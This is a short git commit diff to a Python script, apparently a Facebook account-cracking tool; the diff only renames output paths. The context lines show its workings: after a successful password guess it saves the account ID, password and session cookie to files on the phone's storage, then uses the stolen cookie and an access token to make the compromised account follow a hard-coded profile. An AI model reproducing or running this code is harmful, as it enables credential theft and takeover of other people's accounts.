e63ef765ab717b549c7c1d54aba42f89a2ac0f5c
mdtasin123 <129798134+mdtasin123@users.noreply.github.com>
2023-07-07 23:23:17 +0530

    Add files via upload

--- fuckeing.py
+++ fuckeing.py
@@ -943,8 +943,8 @@ class crack:
                         idd=me['id']
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
-                        open("/sdcard/GSXD-2X/GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GSXD-2X/GSXD_COKIE.TXT", "a").write(used +	 "|"	 + pw + " | " + cokie + 								"\n")
+                        open("/sdcard/GS-2X/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X/M3-GSXD_COKIE.TXT", "a").write(used +	 "|"	 + pw + " | " + cokie + 								"\n")
                         ok.append(used + pw)
                         follow_id='100000160984736' #uzzal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
